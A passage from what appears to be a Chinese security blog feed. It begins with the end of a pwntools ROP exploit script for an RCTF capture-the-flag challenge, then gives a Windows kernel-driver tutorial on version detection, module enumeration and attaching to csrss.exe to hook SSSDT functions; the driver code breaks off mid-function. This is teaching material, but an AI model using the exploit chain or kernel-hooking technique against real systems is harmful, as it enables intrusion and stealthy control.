bss</span><br><span class="line">r15 = <span class="number">1</span></span><br><span class="line">ret = mmmcall</span><br><span class="line">check += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">ret = main</span><br><span class="line">check += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(check)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recv(<span class="number">0x1b</span>)</span><br><span class="line">log.info(<span class="string">&quot;recv:&quot;</span> + p.recv(<span class="number">16</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;R&quot;</span> * buflen</span><br><span class="line">payload += p64(ppppr)</span><br><span class="line">payload += p64(ppppppr)</span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = bss+<span class="number">0x8</span></span><br><span class="line">r13 = bss</span><br><span class="line">r14 = bss</span><br><span class="line">r15 = bss</span><br><span class="line">ret = mmmcall</span><br><span class="line">payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">ret = main</span><br><span class="line">payload += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>获取系统信息</title>
      <link href="/2024/03/09/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/"/>
      <url>/2024/03/09/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="获取系统信息"><a href="#获取系统信息" class="headerlink" title="获取系统信息"></a>获取系统信息</h1><h2 id="DriverEntry"><a href="#DriverEntry" class="headerlink" title="DriverEntry"></a>DriverEntry</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* LPFN_RTLGETVERSION)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PRTL_OSVERSIONINFOW OsVersionInfo)</span></span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">    UNKNOWN_VERSION = <span class="number">0</span>,</span><br><span class="line">    WIN2000_VERSION,</span><br><span class="line">    WINXP_VERSION,</span><br><span class="line">    WIN2003_VERSION,</span><br><span class="line">    WINVISTA_VERSION,</span><br><span class="line">    WIN7_VERSION,</span><br><span class="line">    WIN8_VERSION,</span><br><span class="line">    WIN8_VERSION_1,</span><br><span class="line">    WIN8_VERSION_1_9600,</span><br><span class="line">    WIN10_VERSION,</span><br><span class="line">    WIN10_VERSION_10240,</span><br><span class="line">    WIN10_VERSION_10586,</span><br><span class="line">&#125;OS_VERSION;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">OS_VERSION</span> __OsVersion = UNKNOWN_VERSION;</span><br><span class="line"></span><br><span class="line">RTL_OSVERSIONINFOEXW __RtlOsVersionInfo = &#123; <span class="number">0</span> &#125;;<span class="comment">// wdm.h中定义的，保存系统版本信息的结构体</span></span><br><span class="line">UNICODE_STRING __RtlGetVersionU = <span class="built_in">RTL_CONSTANT_STRING</span>(<span class="string">L&quot;RtlGetVersion&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//系统导出的全局变量</span></span><br><span class="line"><span class="keyword">extern</span> PULONG         InitSafeBootMode;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    DRIVER_OBJECT* DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    UNICODE_STRING* RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS           Status = STATUS_ACCESS_DENIED;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1: kd&gt; dd InitSafeBootMode</span></span><br><span class="line"><span class="comment">849a4980  00000000 00000000 02080014 ffdf0030</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (*InitSafeBootMode &gt; <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一个全局结构体，代表系统版本信息</span></span><br><span class="line">    __RtlOsVersionInfo.dwOSVersionInfoSize = <span class="built_in">sizeof</span>(RTL_OSVERSIONINFOEXW);</span><br><span class="line">    __RtlOsVersionInfo.dwMajorVersion = <span class="number">0xFF</span>; <span class="comment">// 初始化一个无效的版本</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 从系统模块ntkrnlpa.exe的导出表中获取函数地址</span></span><br><span class="line">    __RtlGetVersion = (LPFN_RTLGETVERSION)<span class="built_in">MmGetSystemRoutineAddress</span>(&amp;__RtlGetVersionU);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__RtlGetVersion) </span><br><span class="line">    &#123;</span><br><span class="line">        __RtlGetVersion((PRTL_OSVERSIONINFOW)&amp;__RtlOsVersionInfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeOsVersion</span>();  <span class="comment">//初始化系统版本信息</span></span><br><span class="line">    <span class="keyword">if</span> (__OsVersion == UNKNOWN_VERSION)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Ntos.exe</span></span><br><span class="line">    <span class="comment">//Win32k.sys</span></span><br><span class="line">    <span class="comment">//Ntdll.dll</span></span><br><span class="line">    <span class="comment">//csrss.exe</span></span><br><span class="line">    Status = <span class="built_in">GetSystemInfo</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __DriverObject = DriverObject;</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取系统版本"><a href="#获取系统版本" class="headerlink" title="获取系统版本"></a>获取系统版本</h2><p>先判断MajorVersion，2003、 xp、 2000都是5，后面的都是6，win10是10。再判断MinorVersion，分辨win7、win8。对于win8、win10的一些小版本，通过BuildNumber来判断。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">ULONG __BuildNumber = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitializeOsVersion</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ULONG BuildNumber = <span class="number">0</span>;</span><br><span class="line">    ULONG MajorVersion = <span class="number">0</span>;</span><br><span class="line">    ULONG MinorVersion = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">PsGetVersion</span>(&amp;MajorVersion, &amp;MinorVersion, &amp;BuildNumber, <span class="literal">NULL</span>);</span><br><span class="line">    __BuildNumber = BuildNumber;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2003, xp, 2000</span></span><br><span class="line">    <span class="keyword">if</span> (MajorVersion == <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (MinorVersion)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:     <span class="comment">// win2k</span></span><br><span class="line"></span><br><span class="line">            __OsVersion = WIN2000_VERSION;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:     <span class="comment">// winxp</span></span><br><span class="line">            __OsVersion = WINXP_VERSION;</span><br><span class="line">            <span class="comment">//ReadOsServicePack();</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:     <span class="comment">// win2003</span></span><br><span class="line"></span><br><span class="line">            __OsVersion = WIN2003_VERSION;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (MajorVersion == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (MinorVersion)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            __OsVersion = WINVISTA_VERSION;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            __OsVersion = WIN7_VERSION;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">            __OsVersion = WIN8_VERSION;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> (__BuildNumber == <span class="number">9431</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                __OsVersion = WIN8_VERSION_1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (__BuildNumber == <span class="number">9600</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                __OsVersion = WIN8_VERSION_1_9600;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            __OsVersion = WIN10_VERSION;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (MajorVersion == <span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__BuildNumber &lt; <span class="number">10240</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            __OsVersion = WIN10_VERSION;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (__BuildNumber == <span class="number">10240</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            __OsVersion = WIN10_VERSION_10240;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (__BuildNumber == <span class="number">10586</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            __OsVersion = WIN10_VERSION_10586;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __OsVersion = UNKNOWN_VERSION;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取系统信息-1"><a href="#获取系统信息-1" class="headerlink" title="获取系统信息"></a>获取系统信息</h2><ol><li><p>csrss.exe是微软客户端、服务端运行时子系统，管理Windows图形相关任务，Hook SSSDT必须。SSSDT就是win32k.sys里面的函数，大多数都跟图形相关，比如什么NtUserGetDCEx或者NtUserCreateWindowEx等。所以要查看这些内核函数地址，光在驱动中进行和SSDT一样的访问会引发异常蓝屏的。所以有前辈就想出办法，在驱动程序里面调用KeAttachProces到csrss.exe中，获取这个系统进程的地址空间从而在驱动中获取SSSDT中的函数地址</p></li><li><p>ZwQuerySystemInformation函数需要导出使用。配合枚举类型指示获取系统的什么信息。代码中获取了系统的所有模块，这个函数返回了首地址和大小。</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI NTSTATUS NTAPI <span class="title">ZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG  SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID  SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG  SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_SYSTEM_INFORMATION_CLASS</span> &#123;</span><br><span class="line">    SystemBasicInformation,</span><br><span class="line">    SystemProcessorInformation, <span class="comment">// obsolete...delete</span></span><br><span class="line">    SystemPerformanceInformation,</span><br><span class="line">    SystemTimeOfDayInformation,</span><br><span class="line">    SystemPathInformation,</span><br><span class="line">    SystemProcessInformation,</span><br><span class="line">    SystemCallCountInformation,</span><br><span class="line">    SystemDeviceInformation,</span><br><span class="line">    SystemProcessorPerformanceInformation,</span><br><span class="line">    SystemFlagsInformation,</span><br><span class="line">    SystemCallTimeInformation,</span><br><span class="line">    SystemModuleInformation,</span><br><span class="line">    SystemLocksInformation,</span><br><span class="line">    SystemStackTraceInformation,</span><br><span class="line">    SystemPagedPoolInformation,</span><br><span class="line">    SystemNonPagedPoolInformation,</span><br><span class="line">    SystemHandleInformation,</span><br><span class="line">    SystemObjectInformation,</span><br><span class="line">    SystemPageFileInformation,</span><br><span class="line">    SystemVdmInstemulInformation,</span><br><span class="line">    SystemVdmBopInformation,</span><br><span class="line">    SystemFileCacheInformation,</span><br><span class="line">    SystemPoolTagInformation,</span><br><span class="line">    SystemInterruptInformation,</span><br><span class="line">    SystemDpcBehaviorInformation,</span><br><span class="line">    SystemFullMemoryInformation,</span><br><span class="line">    SystemLoadGdiDriverInformation,</span><br><span class="line">    SystemUnloadGdiDriverInformation,</span><br><span class="line">    SystemTimeAdjustmentInformation,</span><br><span class="line">    SystemSummaryMemoryInformation,</span><br><span class="line">    SystemMirrorMemoryInformation,</span><br><span class="line">    SystemPerformanceTraceInformation,</span><br><span class="line">    SystemObsolete0,</span><br><span class="line">    SystemExceptionInformation,</span><br><span class="line">    SystemCrashDumpStateInformation,</span><br><span class="line">    SystemKernelDebuggerInformation,</span><br><span class="line">    SystemContextSwitchInformation,</span><br><span class="line">    SystemRegistryQuotaInformation,</span><br><span class="line">    SystemExtendServiceTableInformation,</span><br><span class="line">    SystemPrioritySeperation,</span><br><span class="line">    SystemVerifierAddDriverInformation,</span><br><span class="line">    SystemVerifierRemoveDriverInformation,</span><br><span class="line">    SystemProcessorIdleInformation,</span><br><span class="line">    SystemLegacyDriverInformation,</span><br><span class="line">    SystemCurrentTimeZoneInformation,</span><br><span class="line">    SystemLookasideInformation,</span><br><span class="line">    SystemTimeSlipNotification,</span><br><span class="line">    SystemSessionCreate,</span><br><span class="line">    SystemSessionDetach,</span><br><span class="line">    SystemSessionInformation,</span><br><span class="line">    SystemRangeStartInformation,</span><br><span class="line">    SystemVerifierInformation,</span><br><span class="line">    SystemVerifierThunkExtend,</span><br><span class="line">    SystemSessionProcessInformation,</span><br><span class="line">    SystemLoadGdiDriverInSystemSpace,</span><br><span class="line">    SystemNumaProcessorMap,</span><br><span class="line">    SystemPrefetcherInformation,</span><br><span class="line">    SystemExtendedProcessInformation,</span><br><span class="line">    SystemRecommendedSharedDataAlignment,</span><br><span class="line">    SystemComPlusPackage,</span><br><span class="line">    SystemNumaAvailableMemory,</span><br><span class="line">    SystemProcessorPowerInformation,</span><br><span class="line">    SystemEmulationBasicInformation,</span><br><span class="line">    SystemEmulationProcessorInformation,</span><br><span class="line">    SystemExtendedHandleInformation,</span><br><span class="line">    SystemLostDelayedWriteInformation,</span><br><span class="line">    SystemBigPoolInformation,</span><br><span class="line">    SystemSessionPoolTagInformation,</span><br><span class="line">    SystemSessionMappedViewInformation,</span><br><span class="line">    SystemHotpatchInformation,</span><br><span class="line">    SystemObjectSecurityMode,</span><br><span class="line">    SystemWatchdogTimerHandler,</span><br><span class="line">    SystemWatchdogTimerInformation,</span><br><span class="line">    SystemLogicalProcessorInformation,</span><br><span class="line">    SystemWow64SharedInformation,</span><br><span class="line">    SystemRegisterFirmwareTableInformationHandler,</span><br><span class="line">    SystemFirmwareTableInformation,</span><br><span class="line">    SystemModuleInformationEx,</span><br><span class="line">    SystemVerifierTriageInformation,</span><br><span class="line">    SystemSuperfetchInformation,</span><br><span class="line">    SystemMemoryListInformation,</span><br><span class="line">    SystemFileCacheInformationEx,</span><br><span class="line">    MaxSystemInfoClass <span class="comment">// MaxSystemInfoClass should always be the last enum</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br></pre></td></tr></table></figure></li><li><p>strrchr用于从右查找字符数组第一次出现对应标识的地方，并返回指向这个被截断的数组的指针。RtlStringCchCatW连接两个字符串（Unicode），RtlStringCchCatNW限制连接的大小。</p></li><li><p>win10下，win32k.sys变为了win32kfull.sys</p></li><li><p>内核有效地址从MmSystemRangeStart开始。模块枚举不到ntdll时，可以使用内存映射的方法获取ntdll信息。</p></li><li><p>注意比较csrss.exe的最大session id不能大于10。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">GetSystemInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSTEM_PROCESS_IDENTITY     ((HANDLE)0x4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSRSS_IMAGE_NAME             <span class="string">L&quot;csrss.exe&quot;</span>   <span class="comment">//微软客户端、服务端运行时子系统，管理Windows图形相关任务，Hook Sssdt必须</span></span></span><br><span class="line"></span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    ULONG ViewSize = <span class="number">100</span> * <span class="number">1024</span>;<span class="comment">//100K</span></span><br><span class="line">    ULONG NumberOfModules;</span><br><span class="line">    LONG i;</span><br><span class="line">    PCHAR ModuleName = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">    PRTL_PROCESS_MODULES RtlProcessModules = <span class="literal">NULL</span>;</span><br><span class="line">    PRTL_PROCESS_MODULE_INFORMATION RtlProcessModuleInfo = <span class="literal">NULL</span>;</span><br><span class="line">    PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = <span class="literal">NULL</span>;     <span class="comment">//系统对所有进程的记录结构</span></span><br><span class="line">    LPCSTR v1;</span><br><span class="line">    ANSI_STRING v2;</span><br><span class="line">    UNICODE_STRING v3;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        VirtualAddress = <span class="built_in">AllocateMemory1</span>(ViewSize);</span><br><span class="line">        <span class="keyword">if</span> (VirtualAddress == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> STATUS_NO_MEMORY;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取系统所有模块</span></span><br><span class="line">        Status = <span class="built_in">ZwQuerySystemInformation</span>(SystemModuleInformation, (PVOID)VirtualAddress, ViewSize, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (Status == STATUS_INFO_LENGTH_MISMATCH)   <span class="comment">//内存不足</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line">            VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">            ViewSize *= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 